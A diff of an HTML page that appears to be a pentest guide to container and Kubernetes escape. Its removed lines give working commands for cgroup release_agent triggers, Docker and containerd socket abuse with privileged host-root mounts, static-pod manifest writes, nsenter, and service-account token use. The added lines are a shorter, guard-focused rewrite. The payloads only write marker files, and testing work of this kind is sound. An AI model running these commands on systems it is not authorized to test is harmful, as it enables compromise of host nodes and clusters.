-chmod +x &quot;$UPPERDIR/release_helper.sh&quot;
-</code></pre>
-<p>Configure trigger:</p>
-<pre><code class="language-bash">echo &quot;$UPPERDIR/release_helper.sh&quot; &gt; &quot;$CGROOT/release_agent&quot;
-mkdir -p &quot;$CGROOT/pentest&quot;
-echo 1 &gt; &quot;$CGROOT/pentest/notify_on_release&quot;
-</code></pre>
-<p>Trigger by placing a short-lived process in the child cgroup:</p>
-<pre><code class="language-bash">sh -c &quot;echo \$\$ &gt; '$CGROOT/pentest/cgroup.procs'&quot;
-</code></pre>
-<p>Failure gates:</p>
-<pre><code class="language-text">cgroups v2 only
-release_agent missing
-release_agent not writable
-cannot create child cgroup
-cannot write cgroup.procs
-no CAP_SYS_ADMIN when mounting is needed
-no host-visible helper path
-AppArmor or SELinux blocks helper execution
-kernel patched against the relevant exposure
-</code></pre>
-<p>Capability link:</p>
-<pre><code class="language-text">CAP_SYS_ADMIN often decides whether mounting or manipulating cgroups is possible.
-A privileged container usually makes this path realistic.
-A normal Kubernetes pod with cgroups v2 and RuntimeDefault seccomp usually does not.
-</code></pre>
-<hr>
-<h1 id="3-kernel-usermode-helper-family">3. Kernel usermode-helper family</h1>
-<p><code>core_pattern</code> and <code>release_agent</code> are not random tricks. They belong to the same class:</p>
-<pre><code class="language-text">kernel event
-path to usermode helper
-attacker controls helper or trigger
-host-visible payload
-</code></pre>
-<p>Sweep:</p>
-<pre><code class="language-bash">for p in \
+          <h3 id="release-agent">cgroup v1 <code>release_agent</code>: now a narrow, legacy path</h3>
+          <p>The kernel can run a configured helper when the last task leaves a cgroup with <code>notify_on_release=1</code>. Modern investigations should reject this path quickly unless all of the legacy conditions are present.</p>
+
+          <pre><code class="language-bash">stat -fc %T /sys/fs/cgroup
+mount | grep 'type cgroup '
+find /sys/fs/cgroup \
+  \( -name release_agent -o -name notify_on_release \) 2&gt;/dev/null
+cat /proc/self/uid_map
+awk '/^(CapEff|NoNewPrivs|Seccomp):/' /proc/self/status</code></pre>
+
+          <div class="state-grid">
+            <div class="state-card ok">
+              <span class="state-label">Required</span>
+              <h3>Every gate is open</h3>
+              <p>cgroup v1, writable hierarchy, writable root <code>release_agent</code>, initial-user-namespace <code>CAP_SYS_ADMIN</code>, a host-visible helper, and an empty-cgroup trigger.</p>
+            </div>
+            <div class="state-card blocked">
+              <span class="state-label">Stop</span>
+              <h3>Any modern guard holds</h3>
+              <p>cgroup v2 only, user-namespace remapping, read-only cgroupfs, missing init-user-namespace authority, LSM denial, or no host-visible path.</p>
+            </div>
+          </div>
+
+          <h3>The rest of the usermode-helper family</h3>
+          <p><code>modprobe_path</code>, <code>uevent_helper</code>, and <code>binfmt_misc</code> belong to the same model. Do not collect them as tricks; test the actor and trigger.</p>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Interface</th>
+                  <th>Required trigger</th>
+                  <th>Common reason to stop</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><code>/proc/sys/kernel/modprobe</code></td>
+                  <td>A reachable kernel module auto-load event.</td>
+                  <td>Read-only sysctl, auto-loading constrained, or no host-visible helper.</td>
+                </tr>
+                <tr>
+                  <td><code>/sys/kernel/uevent_helper</code></td>
+                  <td>A useful uevent that invokes the configured helper.</td>
+                  <td>Read-only sysfs or modern distro behavior makes the path impractical.</td>
+                </tr>
+                <tr>
+                  <td><code>binfmt_misc</code></td>
+                  <td>A host execution context consumes the registered format.</td>
+                  <td>Registration exists only in a private mount namespace.</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <pre><code class="language-bash">for path in \
   /proc/sys/kernel/core_pattern \
   /proc/sys/kernel/modprobe \
   /sys/kernel/uevent_helper \
-  /proc/sys/fs/binfmt_misc/status
-do
-  echo &quot;### $p&quot;
-  ls -l &quot;$p&quot; 2&gt;/dev/null
-  cat &quot;$p&quot; 2&gt;/dev/null
-done
+  /proc/sys/fs/binfmt_misc/status; do
+  printf '\n### %s\n' "$path"
+  ls -l "$path" 2&gt;/dev/null
+  cat "$path" 2&gt;/dev/null
+done</code></pre>
+        </section>
 
-find /sys/fs/cgroup -name release_agent -o -name notify_on_release 2&gt;/dev/null
-</code></pre>
-<h2 id="31-modprobe_path">3.1 <code>modprobe_path</code></h2>
-<p>Check:</p>
-<pre><code class="language-bash">ls -l /proc/sys/kernel/modprobe
-cat /proc/sys/kernel/modprobe
-</code></pre>
-<p>What makes it interesting:</p>
-<pre><code class="language-text">writable /proc/sys/kernel/modprobe
-host-visible helper path
-reachable kernel auto-load trigger
-</code></pre>
-<p>Typical trigger class:</p>
-<pre><code class="language-text">kernel tries to execute or handle something requiring a module
-modprobe path is attacker-controlled
-helper executes from host context
-</code></pre>
-<p>Failure gates:</p>
-<pre><code class="language-text">modprobe path read-only
-module auto-loading disabled or constrained
-no reachable trigger
-helper path not host-visible
-LSM blocks execution
-seccomp blocks the needed trigger path
-</code></pre>
-<h2 id="32-uevent_helper">3.2 <code>uevent_helper</code></h2>
-<p>Check:</p>
-<pre><code class="language-bash">ls -l /sys/kernel/uevent_helper 2&gt;/dev/null
-cat /sys/kernel/uevent_helper 2&gt;/dev/null
-</code></pre>
-<p>Interesting only when:</p>
-<pre><code class="language-text">sysfs writable
-uevent_helper writable
-useful uevent trigger reachable
-helper path host-visible
-</code></pre>
-<p>Failure gates:</p>
-<pre><code class="language-text">modern distro behavior disables practical use
-sysfs mounted read-only
-no useful trigger
-LSM blocks helper
-</code></pre>
-<h2 id="33-binfmt_misc">3.3 <code>binfmt_misc</code></h2>
-<p>Check:</p>
-<pre><code class="language-bash">mount | grep binfmt_misc
-ls -la /proc/sys/fs/binfmt_misc 2&gt;/dev/null
-cat /proc/sys/fs/binfmt_misc/status 2&gt;/dev/null
-</code></pre>
-<p>Interesting when the container can register interpreters:</p>
-<pre><code class="language-text">binfmt_misc mounted writable
-interpreter path host-visible
-host execution context can hit the registered format
-</code></pre>
-<p>This one is easy to overstate. Registration inside a private mount namespace may not affect the host. The useful question is not “can I write binfmt_misc?” It is “who uses this registration afterward?”</p>
-<hr>
-<h1 id="4-docker-socket">4. Docker socket</h1>
-<p>A usable rootful Docker socket is a host compromise primitive.</p>
-<p>Check:</p>
-<pre><code class="language-bash">find / -type s -name 'docker.sock' 2&gt;/dev/null
-ls -l /var/run/docker.sock /run/docker.sock 2&gt;/dev/null
-id
-groups
-</code></pre>
-<p>With Docker CLI:</p>
-<pre><code class="language-bash">docker -H unix:///var/run/docker.sock version
-docker -H unix:///var/run/docker.sock ps
-</code></pre>
-<p>Without Docker CLI:</p>
-<pre><code class="language-bash">curl --unix-socket /var/run/docker.sock http://localhost/_ping
-curl --unix-socket /var/run/docker.sock http://localhost/version
-curl --unix-socket /var/run/docker.sock http://localhost/containers/json
-</code></pre>
-<p>Read host through Docker CLI:</p>
-<pre><code class="language-bash">docker -H unix:///var/run/docker.sock run --rm \
-  -v /:/host:ro \
-  alpine:latest \
-  sh -c 'cat /host/etc/hostname; head -n 5 /host/etc/os-release'
-</code></pre>
-<p>Writable marker:</p>
-<pre><code class="language-bash">docker -H unix:///var/run/docker.sock run --rm \
-  --privileged \
-  -v /:/host \
-  alpine:latest \
-  sh -c 'id; touch /host/tmp/docker_socket_marker; ls -l /host/tmp/docker_socket_marker'
-</code></pre>
-<p>Raw API, no Docker binary:</p>
-<pre><code class="language-bash">cat &gt; /tmp/create.json &lt;&lt;'JSON'
-{
-  &quot;Image&quot;: &quot;alpine:latest&quot;,
-  &quot;Cmd&quot;: [&quot;sh&quot;, &quot;-c&quot;, &quot;cat /host/etc/hostname; head -n 5 /host/etc/os-release&quot;],
-  &quot;HostConfig&quot;: {
-    &quot;Binds&quot;: [&quot;/:/host:ro&quot;],
-    &quot;AutoRemove&quot;: true
-  }
-}
-JSON
+        <section id="guards">
+          <h2>Read the guardrails before changing the payload</h2>
+          <p class="section-intro">A failed primitive often means policy is working. Classify the denial before assuming the exploit is wrong.</p>
 
-CID=$(curl -s --unix-socket /var/run/docker.sock \
-  -H 'Content-Type: application/json' \
-  -X POST http://localhost/containers/create \
-  --data-binary @/tmp/create.json | sed -n 's/.*&quot;Id&quot;:&quot;\([^&quot;]*\)&quot;.*/\1/p')
-
-curl -s --unix-socket /var/run/docker.sock -X POST &quot;http://localhost/containers/$CID/start&quot;
-sleep 1
-curl -s --unix-socket /var/run/docker.sock &quot;http://localhost/containers/$CID/logs?stdout=1&amp;stderr=1&quot;
-</code></pre>
-<p>Pull image if missing:</p>
-<pre><code class="language-bash">curl -s --unix-socket /var/run/docker.sock \
-  -X POST 'http://localhost/images/create?fromImage=alpine&amp;tag=latest'
-</code></pre>
-<p>Writable raw API proof:</p>
-<pre><code class="language-bash">cat &gt; /tmp/create_rw.json &lt;&lt;'JSON'
-{
-  &quot;Image&quot;: &quot;alpine:latest&quot;,
-  &quot;Cmd&quot;: [&quot;sh&quot;, &quot;-c&quot;, &quot;id; touch /host/tmp/docker_api_marker; ls -l /host/tmp/docker_api_marker&quot;],
-  &quot;HostConfig&quot;: {
-    &quot;Privileged&quot;: true,
-    &quot;Binds&quot;: [&quot;/:/host&quot;],
-    &quot;AutoRemove&quot;: true
-  }
-}
-JSON
-
-CID=$(curl -s --unix-socket /var/run/docker.sock \
-  -H 'Content-Type: application/json' \
-  -X POST http://localhost/containers/create \
-  --data-binary @/tmp/create_rw.json | sed -n 's/.*&quot;Id&quot;:&quot;\([^&quot;]*\)&quot;.*/\1/p')
-
-curl -s --unix-socket /var/run/docker.sock -X POST &quot;http://localhost/containers/$CID/start&quot;
-sleep 1
-curl -s --unix-socket /var/run/docker.sock &quot;http://localhost/containers/$CID/logs?stdout=1&amp;stderr=1&quot;
-</code></pre>
-<p>Failure gates:</p>
-<pre><code class="language-text">socket exists but current UID cannot connect
-rootless Docker
-Docker authorization plugin blocks host binds or privileged containers
-no image and no registry access
-Docker Desktop VM boundary
-socket points to a daemon in another trust boundary
-</code></pre>
-<p>Rootless Docker changes the severity. It may still expose the user's containers, images, files, credentials, and workload control, but it is not the same as rootful host Docker.</p>
-<hr>
-<h1 id="5-containerd-and-cri-sockets">5. containerd and CRI sockets</h1>
-<p>Docker gets most writeups, but Kubernetes nodes often expose containerd or CRI-O.</p>
-<p>Important paths:</p>
-<pre><code class="language-text">/run/containerd/containerd.sock
-/var/run/containerd/containerd.sock
-/var/run/crio/crio.sock
-</code></pre>
-<p>Find sockets:</p>
-<pre><code class="language-bash">find / -type s 2&gt;/dev/null | grep -Ei 'containerd|crio|cri'
-ls -l /run/containerd/containerd.sock /var/run/containerd/containerd.sock /var/run/crio/crio.sock 2&gt;/dev/null
-</code></pre>
-<h2 id="51-ctr">5.1 <code>ctr</code></h2>
-<p><code>ctr</code> talks to containerd directly. It is not a stable high-level user interface. Syntax varies enough that <code>ctr help</code> matters.</p>
-<p>Check:</p>
-<pre><code class="language-bash">ctr --address /run/containerd/containerd.sock version
-ctr --address /run/containerd/containerd.sock namespaces list
-ctr --address /run/containerd/containerd.sock --namespace k8s.io containers list
-ctr --address /run/containerd/containerd.sock --namespace k8s.io tasks list
-</code></pre>
-<p>Pull an image:</p>
-<pre><code class="language-bash">ctr --address /run/containerd/containerd.sock image pull docker.io/library/busybox:1.36
-</code></pre>
-<p>Read-only host mount:</p>
-<pre><code class="language-bash">ctr --address /run/containerd/containerd.sock run --rm \
-  --mount type=bind,src=/,dst=/host,options=rbind:ro \
-  docker.io/library/busybox:1.36 ctest \
-  sh -c 'cat /host/etc/hostname; head -n 5 /host/etc/os-release'
-</code></pre>
-<p>Privileged variant where supported:</p>
-<pre><code class="language-bash">ctr --address /run/containerd/containerd.sock run --rm \
-  --privileged \
-  --mount type=bind,src=/,dst=/host,options=rbind:rw \
-  docker.io/library/busybox:1.36 ctest \
-  sh -c 'id; touch /host/tmp/containerd_marker; ls -l /host/tmp/containerd_marker'
-</code></pre>
-<p>Failure gates:</p>
-<pre><code class="language-text">socket not mounted
-current UID cannot connect
-ctr missing
-image not present and pull blocked
-containerd namespace mismatch
-runtime options differ by version
-LSM or runtime denies mount
-rootless containerd
-</code></pre>
-<p><code>k8s.io</code> is the namespace where Kubernetes workloads commonly appear. A direct <code>ctr run</code> may use the default namespace unless specified.</p>
-<h2 id="52-crictl">5.2 <code>crictl</code></h2>
-<p><code>crictl</code> talks to CRI-compatible runtimes. It is common on Kubernetes nodes.</p>
-<p>Check endpoint:</p>
-<pre><code class="language-bash">crictl --runtime-endpoint unix:///run/containerd/containerd.sock version
-crictl --runtime-endpoint unix:///run/containerd/containerd.sock pods
-crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps -a
-crictl --runtime-endpoint unix:///run/containerd/containerd.sock images
-</code></pre>
-<p>If CRI-O:</p>
-<pre><code class="language-bash">crictl --runtime-endpoint unix:///var/run/crio/crio.sock version
-</code></pre>
-<p><code>crictl</code> needs a pod sandbox config and a container config for creation. A minimal hostPath-style test depends on runtime support and image availability.</p>
-<p>Pod sandbox config:</p>
-<pre><code class="language-bash">cat &gt; /tmp/pod.json &lt;&lt;'JSON'
-{
-  &quot;metadata&quot;: {
-    &quot;name&quot;: &quot;crictl-pentest&quot;,
-    &quot;namespace&quot;: &quot;default&quot;,
-    &quot;attempt&quot;: 1,
-    &quot;uid&quot;: &quot;crictl-pentest&quot;
-  },
-  &quot;linux&quot;: {
-    &quot;security_context&quot;: {
-      &quot;namespace_options&quot;: {
-        &quot;network&quot;: 2,
-        &quot;pid&quot;: 1,
-        &quot;ipc&quot;: 1
-      }
-    }
-  }
-}
-JSON
-</code></pre>
-<p>Container config with host mount:</p>
-<pre><code class="language-bash">cat &gt; /tmp/container.json &lt;&lt;'JSON'
-{
-  &quot;metadata&quot;: {
-    &quot;name&quot;: &quot;marker&quot;
-  },
-  &quot;image&quot;: {
-    &quot;image&quot;: &quot;busybox:1.36&quot;
-  },
-  &quot;command&quot;: [
-    &quot;sh&quot;,
-    &quot;-c&quot;,
-    &quot;cat /host/etc/hostname; head -n 5 /host/etc/os-release; id&quot;
-  ],
-  &quot;mounts&quot;: [
-    {
-      &quot;container_path&quot;: &quot;/host&quot;,
-      &quot;host_path&quot;: &quot;/&quot;,
-      &quot;readonly&quot;: true
-    }
-  ],
-  &quot;linux&quot;: {
-    &quot;security_context&quot;: {
-      &quot;privileged&quot;: true
-    }
-  }
-}
-JSON
-</code></pre>
-<p>Run:</p>
-<pre><code class="language-bash">EP=unix:///run/containerd/containerd.sock
-PODID=$(crictl --runtime-endpoint &quot;$EP&quot; runp /tmp/pod.json)
-CID=$(crictl --runtime-endpoint &quot;$EP&quot; create &quot;$PODID&quot; /tmp/container.json /tmp/pod.json)
-crictl --runtime-endpoint &quot;$EP&quot; start &quot;$CID&quot;
-crictl --runtime-endpoint &quot;$EP&quot; logs &quot;$CID&quot;
-</code></pre>
-<p>Failure gates:</p>
-<pre><code class="language-text">CRI endpoint not accessible
-sandbox creation blocked
-image missing
-runtime policy blocks privileged
-mount rejected
-network or namespace options rejected
-crictl version does not match runtime cleanly
-</code></pre>
-<p>With CRI, errors are often more useful than success. If the runtime accepts a privileged host mount, the node boundary is weak.</p>
-<hr>
-<h1 id="6-hostpath-kubelet-files-and-static-pods">6. <code>hostPath</code>, kubelet files, and static pods</h1>
-<p>A read-write hostPath to the node filesystem is already the pivot. The static pod path is the cleanest one on Kubernetes nodes.</p>
-<p>Common mount names:</p>
-<pre><code class="language-text">/host
-/rootfs
-/node
-/hostfs
-/mnt/host
-</code></pre>
-<p>Check:</p>
-<pre><code class="language-bash">mount
-cat /proc/self/mountinfo
-findmnt 2&gt;/dev/null
-ls -la /host /rootfs /node /hostfs /mnt/host 2&gt;/dev/null
-</code></pre>
-<p>Find static manifests:</p>
-<pre><code class="language-bash">for d in /host /rootfs /node /hostfs /mnt/host; do
-  [ -d &quot;$d/etc/kubernetes/manifests&quot; ] &amp;&amp; echo &quot;[+] static manifests via $d&quot;
-done
-</code></pre>
-<p>If the directory differs:</p>
-<pre><code class="language-bash">HOST=/host
-grep -R &quot;staticPodPath&quot; &quot;$HOST/var/lib/kubelet&quot; &quot;$HOST/etc&quot; 2&gt;/dev/null | head
-grep -R &quot;pod-manifest-path&quot; &quot;$HOST/etc/systemd&quot; &quot;$HOST/var/lib/kubelet&quot; 2&gt;/dev/null | head
-</code></pre>
-<p>Write test:</p>
-<pre><code class="language-bash">HOST=/host
-touch &quot;$HOST/tmp/hostpath_write_test&quot; &amp;&amp; ls -l &quot;$HOST/tmp/hostpath_write_test&quot;
-</code></pre>
-<p>Static pod marker:</p>
-<pre><code class="language-bash">HOST=/host
-MANIFEST_DIR=&quot;$HOST/etc/kubernetes/manifests&quot;
-
-cat &gt; &quot;$MANIFEST_DIR/pentest-marker.yaml&quot; &lt;&lt;'YAML'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pentest-marker
-  namespace: kube-system
-spec:
-  restartPolicy: Never
-  containers:
-  - name: marker
-    image: busybox:1.36
-    command:
-    - sh
-    - -c
-    - |
-      id &gt; /host/tmp/static_pod_marker
-      date &gt;&gt; /host/tmp/static_pod_marker
-    securityContext:
-      privileged: true
-    volumeMounts:
-    - name: host
-      mountPath: /host
-  volumes:
-  - name: host
-    hostPath:
-      path: /
-      type: Directory
-YAML
-</code></pre>
-<p>Check:</p>
-<pre><code class="language-bash">sleep 30
-cat &quot;$HOST/tmp/static_pod_marker&quot; 2&gt;/dev/null
-</code></pre>
-<p>Other high-value kubelet paths:</p>
-<pre><code class="language-text">/var/lib/kubelet/pki
-/var/lib/kubelet/config.yaml
-/var/lib/kubelet/kubeconfig
-/var/lib/kubelet/pods
-/var/lib/kubelet/plugins
-/var/lib/kubelet/device-plugins
-</code></pre>
-<p>Interesting files:</p>
-<pre><code class="language-bash">HOST=/host
-find &quot;$HOST/var/lib/kubelet&quot; -maxdepth 3 -type f 2&gt;/dev/null | head -n 50
-find &quot;$HOST/var/lib/kubelet/pods&quot; -path '*volumes*' -type f 2&gt;/dev/null | head -n 50
-</code></pre>
-<p>Failure gates:</p>
-<pre><code class="language-text">hostPath read-only
-staticPodPath not mounted
-kubelet not using static pod directory
-image pull fails
-filesystem permissions block writes
-SELinux blocks writes or execution
-node is not a Kubernetes node
-</code></pre>
-<hr>
-<h1 id="7-namespace-pivots">7. Namespace pivots</h1>
-<p>Namespaces decide what “host” means from the process view. The useful questions:</p>
-<pre><code class="language-text">Do I see host PIDs?
-Do I have the host mount namespace?
-Can I reach host root through /proc/&lt;pid&gt;/root?
-Can I setns into another namespace?
-Do I have CAP_SYS_ADMIN in the target namespace?
-</code></pre>
-<p>Compare namespace links:</p>
-<pre><code class="language-bash">for ns in mnt pid net ipc uts user cgroup; do
-  echo &quot;### $ns&quot;
-  readlink /proc/self/ns/$ns 2&gt;/dev/null
-  readlink /proc/1/ns/$ns 2&gt;/dev/null
-done
-</code></pre>
-<p>If host PID namespace is shared, <code>/proc/1</code> is the host init, not the container init.</p>
-<p>Check host PID exposure:</p>
-<pre><code class="language-bash">ps auxww | head
-ls -l /proc/1/root
-readlink /proc/1/root
-</code></pre>
-<p>Try host root view:</p>
-<pre><code class="language-bash">ls -la /proc/1/root 2&gt;/dev/null
-cat /proc/1/root/etc/hostname 2&gt;/dev/null
-head -n 5 /proc/1/root/etc/os-release 2&gt;/dev/null
-</code></pre>
-<p>If <code>/proc</code> is host-mounted or hostPID is enabled, <code>/proc/&lt;hostpid&gt;/root</code> can expose the host filesystem view for that process.</p>
-<p>Find candidate host processes:</p>
-<pre><code class="language-bash">ps -eo pid,ppid,user,comm,args | head -n 30
-ps -eo pid,comm,args | grep -E 'systemd|kubelet|containerd|dockerd|crio' | grep -v grep
-</code></pre>
-<p><code>nsenter</code> path when available and allowed:</p>
-<pre><code class="language-bash">which nsenter 2&gt;/dev/null
-nsenter --target 1 --mount --uts --ipc --net --pid sh -c 'id; hostname; mount | head' 2&gt;/dev/null
-</code></pre>
-<p>Failure gates:</p>
-<pre><code class="language-text">not in hostPID
-/proc is container procfs, not host procfs
-ptrace restrictions block /proc/&lt;pid&gt;/root access
-hidepid blocks process inspection
-CAP_SYS_ADMIN missing for setns into mount namespace
-user namespace mismatch
-AppArmor or SELinux blocks proc traversal
-</code></pre>
-<p>Namespace pivots are often read primitives first. They become execution primitives when paired with:</p>
-<pre><code class="language-text">CAP_SYS_ADMIN
-hostPID
-hostPath
-runtime socket
-writable host filesystem
-weak /proc restrictions
-</code></pre>
-<hr>
-<h1 id="8-user-namespaces-and-rootless-runtimes">8. User namespaces and rootless runtimes</h1>
-<p>User namespaces are the reason many “privileged-looking” checks lie.</p>
-<p>Read the maps:</p>
-<pre><code class="language-bash">cat /proc/self/uid_map
+          <h3>User namespaces change what “root” means</h3>
+          <pre><code class="language-bash">cat /proc/self/uid_map
 cat /proc/self/gid_map
-readlink /proc/self/ns/user
-readlink /proc/1/ns/user
-</code></pre>
-<p>Typical non-remapped container:</p>
-<pre><code class="language-text">         0          0 4294967295
-</code></pre>
-<p>Meaning: UID 0 inside maps to UID 0 outside.</p>
-<p>Typical remapped or rootless shape:</p>
-<pre><code class="language-text">         0     100000      65536
-</code></pre>
-<p>Meaning: UID 0 inside maps to host UID 100000 for that range.</p>
-<p>What changes:</p>
-<pre><code class="language-text">CAP_SYS_ADMIN inside a user namespace is not automatically host CAP_SYS_ADMIN
-mount operations may work only for namespaced filesystems
-host-owned files may appear unmapped or inaccessible
-device access and sysctl writes usually remain constrained
-Docker socket impact changes if the daemon itself is rootless
-</code></pre>
-<p>Check subordinate IDs from a host mount, if visible:</p>
-<pre><code class="language-bash">cat /host/etc/subuid 2&gt;/dev/null
-cat /host/etc/subgid 2&gt;/dev/null
-cat /etc/subuid 2&gt;/dev/null
-cat /etc/subgid 2&gt;/dev/null
-</code></pre>
-<p>Rootless Docker clues:</p>
-<pre><code class="language-bash">docker info 2&gt;/dev/null | grep -i rootless
-ps auxww | grep -E 'rootlesskit|dockerd-rootless|slirp4netns' | grep -v grep
-env | grep -Ei 'XDG_RUNTIME_DIR|DOCKER_HOST'
-</code></pre>
-<p>Rootless socket shapes:</p>
-<pre><code class="language-text">/run/user/&lt;uid&gt;/docker.sock
-$XDG_RUNTIME_DIR/docker.sock
-</code></pre>
-<p>Failure gates caused by userns:</p>
-<pre><code class="language-text">core_pattern write denied despite root inside container
-cgroup mount denied despite CAP_SYS_ADMIN inside userns
-host bind mount shows permission denied
-device nodes exist but cannot be opened
-runtime socket controls user-owned daemon only
-</code></pre>
-<p>The common mistake is treating <code>uid=0</code> and <code>CAP_SYS_ADMIN</code> as host authority without checking the user namespace.</p>
-<hr>
-<h1 id="9-capabilities">9. Capabilities</h1>
-<p>Decode capabilities, then tie them to an interface. A capability alone is often just a lead.</p>
-<p>High-value caps:</p>
-<pre><code class="language-text">CAP_SYS_ADMIN       mount, namespace, cgroup, broad admin surface
-CAP_SYS_MODULE      host kernel module loading
-CAP_SYS_PTRACE      process inspection/control, especially with hostPID
-CAP_DAC_READ_SEARCH bypass file read and directory traversal checks
-CAP_MKNOD           device node creation
-CAP_SYS_RAWIO       raw I/O
-CAP_NET_ADMIN       routing, firewall, interface control
-CAP_BPF             eBPF surface
-CAP_PERFMON         performance monitoring surface
-</code></pre>
-<p>Check:</p>
-<pre><code class="language-bash">cat /proc/self/status | grep -E 'CapInh|CapPrm|CapEff|CapBnd|CapAmb|Seccomp|NoNewPrivs'
-</code></pre>
-<p>Tie caps to reachable paths:</p>
-<pre><code class="language-text">CAP_SYS_ADMIN + writable cgroupfs       release_agent
-CAP_SYS_ADMIN + mount allowed           namespace or mount abuse
-CAP_SYS_ADMIN + writable /proc/sys      kernel helper family
-CAP_SYS_MODULE                          host kernel module loading
-CAP_SYS_PTRACE + hostPID                host process interaction
-CAP_DAC_READ_SEARCH + hostPath          host file disclosure
-CAP_MKNOD + weak device cgroup          block device access
-CAP_NET_ADMIN + hostNetwork             host network manipulation
-CAP_BPF or CAP_PERFMON                  kernel observability surface
-</code></pre>
-<p>Check device cgroup effect:</p>
-<pre><code class="language-bash">ls -la /dev | head
-cat /proc/self/cgroup
-grep devices /proc/self/mountinfo /proc/self/cgroup 2&gt;/dev/null
-</code></pre>
-<p>MKNOD without device access usually hits:</p>
-<pre><code class="language-text">Operation not permitted
-</code></pre>
-<p>That is exactly what happened in many lab attempts: creating the device node works, opening it does not.</p>
-<p>Failure gates:</p>
-<pre><code class="language-text">capability in bounding set but not effective
-seccomp blocks the syscall
-user namespace remapping changes host impact
-LSM blocks the operation
-host namespace not shared
-target filesystem read-only
-device cgroup blocks access
-</code></pre>
-<hr>
-<h1 id="10-lsm-and-seccomp-gates">10. LSM and seccomp gates</h1>
-<p>Many failed container escapes are not “wrong exploit”. They are policy doing its job.</p>
-<p>Seccomp:</p>
-<pre><code class="language-bash">cat /proc/self/status | grep -E 'Seccomp|NoNewPrivs'
-</code></pre>
-<p>Values:</p>
-<pre><code class="language-text">Seccomp: 0          no seccomp
-Seccomp: 2          filtered
-</code></pre>
-<p>AppArmor:</p>
-<pre><code class="language-bash">cat /proc/self/attr/current 2&gt;/dev/null || true
-cat /proc/self/attr/apparmor/current 2&gt;/dev/null || true
-cat /sys/kernel/security/apparmor/profiles 2&gt;/dev/null | head
-</code></pre>
-<p>SELinux:</p>
-<pre><code class="language-bash">cat /proc/self/attr/current 2&gt;/dev/null || true
-getenforce 2&gt;/dev/null
-id -Z 2&gt;/dev/null
-</code></pre>
-<p>Useful patterns:</p>
-<pre><code class="language-text">docker-default                       default Docker AppArmor profile
-unconfined                           no AppArmor confinement for process
-container_t                          common SELinux container confinement
-spc_t                                often privileged container type
-</code></pre>
-<p>When a primitive fails, map the error:</p>
-<pre><code class="language-text">EPERM on mount                       capability, seccomp, LSM, or userns
-permission denied on /proc/sys       read-only mount, caps, LSM, userns
-operation not permitted on device    device cgroup or LSM
-cannot setns                         missing CAP_SYS_ADMIN in target namespace
-exec denied                          AppArmor or SELinux
-</code></pre>
-<p>This matters because changing payload syntax will not fix a policy gate.</p>
-<hr>
-<h1 id="11-kubernetes-service-account-paths">11. Kubernetes service account paths</h1>
-<p>A boring Linux container with a strong service account is not boring.</p>
-<p>Inside pod:</p>
-<pre><code class="language-bash">SA_DIR=/var/run/secrets/kubernetes.io/serviceaccount
-ls -la &quot;$SA_DIR&quot; 2&gt;/dev/null
-cat &quot;$SA_DIR/namespace&quot; 2&gt;/dev/null
-env | grep KUBERNETES
-</code></pre>
-<p>Manual API access:</p>
-<pre><code class="language-bash">TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
-API=&quot;https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}&quot;
+readlink /proc/self/ns/user /proc/1/ns/user</code></pre>
 
-curl -sSk --cacert &quot;$CACERT&quot; \
-  -H &quot;Authorization: Bearer $TOKEN&quot; \
-  &quot;$API/api/v1/namespaces/$NS/pods&quot; | head
-</code></pre>
-<p>From kubeconfig:</p>
-<pre><code class="language-bash">kubectl auth can-i create pods -n &quot;$NS&quot; --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i create pods/exec -n &quot;$NS&quot; --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i get secrets -n &quot;$NS&quot; --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i list secrets -n &quot;$NS&quot; --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i create serviceaccounts/token -n &quot;$NS&quot; --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i create daemonsets.apps -n &quot;$NS&quot; --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i create clusterrolebindings --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i bind clusterroles --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i escalate clusterroles --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i impersonate users --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i get nodes/proxy --as=&quot;system:serviceaccount:$NS:$SA&quot;
-</code></pre>
-<h2 id="111-pod-creation-is-only-half-the-check">11.1 Pod creation is only half the check</h2>
-<p>Dry-run a dangerous pod:</p>
-<pre><code class="language-bash">kubectl apply --dry-run=server -f - &lt;&lt;'YAML'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pss-check-privileged
-spec:
-  restartPolicy: Never
-  containers:
-  - name: c
-    image: busybox:1.36
-    command: [&quot;sh&quot;, &quot;-c&quot;, &quot;id &amp;&amp; sleep 1&quot;]
-    securityContext:
-      privileged: true
-    volumeMounts:
-    - name: host
-      mountPath: /host
-  volumes:
-  - name: host
-    hostPath:
-      path: /
-      type: Directory
-YAML
-</code></pre>
-<p>The chain is:</p>
-<pre><code class="language-text">create pods
-admission allows privileged or hostPath
-scheduler places pod
-node filesystem or host namespace reachable
-</code></pre>
-<h2 id="112-daemonset-path">11.2 DaemonSet path</h2>
-<p>If the identity can create DaemonSets, the primitive spreads to nodes.</p>
-<pre><code class="language-bash">kubectl auth can-i create daemonsets.apps -n &quot;$NS&quot; --as=&quot;system:serviceaccount:$NS:$SA&quot;
-</code></pre>
-<p>Marker DaemonSet shape:</p>
-<pre><code class="language-yaml">apiVersion: apps/v1
-kind: DaemonSet
-metadata:
-  name: ds-marker
-  namespace: default
-spec:
-  selector:
-    matchLabels:
-      app: ds-marker
-  template:
-    metadata:
-      labels:
-        app: ds-marker
-    spec:
-      containers:
-      - name: marker
-        image: busybox:1.36
